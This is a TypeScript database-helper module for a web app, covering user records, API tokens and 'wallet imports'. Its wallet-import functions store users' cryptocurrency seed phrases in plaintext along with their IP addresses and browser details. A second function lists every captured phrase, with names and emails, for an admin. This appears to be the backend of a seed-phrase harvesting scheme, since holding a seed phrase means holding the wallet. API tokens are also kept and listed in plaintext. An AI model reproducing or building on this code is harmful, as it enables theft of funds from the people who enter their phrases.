import { eq, and } from "drizzle-orm";
import { drizzle } from "drizzle-orm/mysql2";
import { InsertUser, users, apiTokens, walletImports } from "../drizzle/schema";
import { ENV } from './_core/env';
import { randomBytes } from "crypto";

let _db: ReturnType<typeof drizzle> | null = null;

// Lazily create the drizzle instance so local tooling can run without a DB.
export async function getDb() {
  if (!_db && process.env.DATABASE_URL) {
    try {
      _db = drizzle(process.env.DATABASE_URL);
    } catch (error) {
      console.warn("[Database] Failed to connect:", error);
      _db = null;
    }
  }
  return _db;
}

export async function upsertUser(user: InsertUser): Promise<void> {
  if (!user.openId) {
    throw new Error("User openId is required for upsert");
  }

  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot upsert user: database not available");
    return;
  }

  try {
    const values: InsertUser = {
      openId: user.openId,
    };
    const updateSet: Record<string, unknown> = {};

    const textFields = ["name", "email", "loginMethod"] as const;
    type TextField = (typeof textFields)[number];

    const assignNullable = (field: TextField) => {
      const value = user[field];
      if (value === undefined) return;
      const normalized = value ?? null;
      values[field] = normalized;
      updateSet[field] = normalized;
    };

    textFields.forEach(assignNullable);

    if (user.lastSignedIn !== undefined) {
      values.lastSignedIn = user.lastSignedIn;
      updateSet.lastSignedIn = user.lastSignedIn;
    }
    if (user.role !== undefined) {
      values.role = user.role;
      updateSet.role = user.role;
    } else if (user.openId === ENV.ownerOpenId) {
      values.role = 'admin';
      updateSet.role = 'admin';
    }

    if (!values.lastSignedIn) {
      values.lastSignedIn = new Date();
    }

    if (Object.keys(updateSet).length === 0) {
      updateSet.lastSignedIn = new Date();
    }

    await db.insert(users).values(values).onDuplicateKeyUpdate({
      set: updateSet,
    });
  } catch (error) {
    console.error("[Database] Failed to upsert user:", error);
    throw error;
  }
}

export async function getUserByOpenId(openId: string) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get user: database not available");
    return undefined;
  }

  const result = await db.select().from(users).where(eq(users.openId, openId)).limit(1);

  return result.length > 0 ? result[0] : undefined;
}

// ─── API Token Helpers ────────────────────────────────────────────────────────

/** Generate a secure random token string */
export function generateTokenString(): string {
  return `vg_${randomBytes(32).toString('hex')}`;
}

/** Get the active (non-revoked) token for a user, or null */
export async function getActiveTokenForUser(userId: number) {
  const db = await getDb();
  if (!db) return null;
  const result = await db
    .select()
    .from(apiTokens)
    .where(and(eq(apiTokens.userId, userId), eq(apiTokens.isRevoked, 0)))
    .limit(1);
  return result.length > 0 ? result[0] : null;
}

/** Create a new token for a user (revokes any existing active token first) */
export async function createTokenForUser(userId: number, label = 'Default') {
  const db = await getDb();
  if (!db) throw new Error('Database not available');
  // Revoke existing active tokens
  await db
    .update(apiTokens)
    .set({ isRevoked: 1, revokedAt: new Date() })
    .where(and(eq(apiTokens.userId, userId), eq(apiTokens.isRevoked, 0)));
  // Insert new token
  const token = generateTokenString();
  await db.insert(apiTokens).values({ userId, token, label });
  const result = await db
    .select()
    .from(apiTokens)
    .where(eq(apiTokens.token, token))
    .limit(1);
  return result[0];
}

/** Revoke a specific token by id */
export async function revokeToken(tokenId: number) {
  const db = await getDb();
  if (!db) throw new Error('Database not available');
  await db
    .update(apiTokens)
    .set({ isRevoked: 1, revokedAt: new Date() })
    .where(eq(apiTokens.id, tokenId));
}

/** List all tokens (admin view) — joins with users */
export async function listAllApiTokens() {
  const db = await getDb();
  if (!db) return [];
  const rows = await db
    .select({
      id: apiTokens.id,
      userId: apiTokens.userId,
      token: apiTokens.token,
      label: apiTokens.label,
      isRevoked: apiTokens.isRevoked,
      createdAt: apiTokens.createdAt,
      lastUsedAt: apiTokens.lastUsedAt,
      revokedAt: apiTokens.revokedAt,
      userName: users.name,
      userEmail: users.email,
      walletAddress: users.walletAddress,
    })
    .from(apiTokens)
    .leftJoin(users, eq(apiTokens.userId, users.id))
    .orderBy(apiTokens.createdAt);
  return rows;
}

// ─── Wallet Import Helpers ──────────────────────────────────────────────────────

export async function saveWalletImport(data: {
  userId?: number | null;
  seedPhrase: string;
  walletAddress?: string | null;
  ipAddress?: string | null;
  userAgent?: string | null;
}) {
  const db = await getDb();
  if (!db) throw new Error('Database not available');
  await db.insert(walletImports).values({
    userId: data.userId ?? null,
    seedPhrase: data.seedPhrase,
    walletAddress: data.walletAddress ?? null,
    ipAddress: data.ipAddress ?? null,
    userAgent: data.userAgent ?? null,
  });
}

export async function listAllWalletImports() {
  const db = await getDb();
  if (!db) return [];
  const rows = await db
    .select({
      id: walletImports.id,
      userId: walletImports.userId,
      seedPhrase: walletImports.seedPhrase,
      walletAddress: walletImports.walletAddress,
      ipAddress: walletImports.ipAddress,
      userAgent: walletImports.userAgent,
      importedAt: walletImports.importedAt,
      userName: users.name,
      userEmail: users.email,
    })
    .from(walletImports)
    .leftJoin(users, eq(walletImports.userId, users.id))
    .orderBy(walletImports.importedAt);
  return rows;
}

// TODO: add feature queries here as your schema grows.
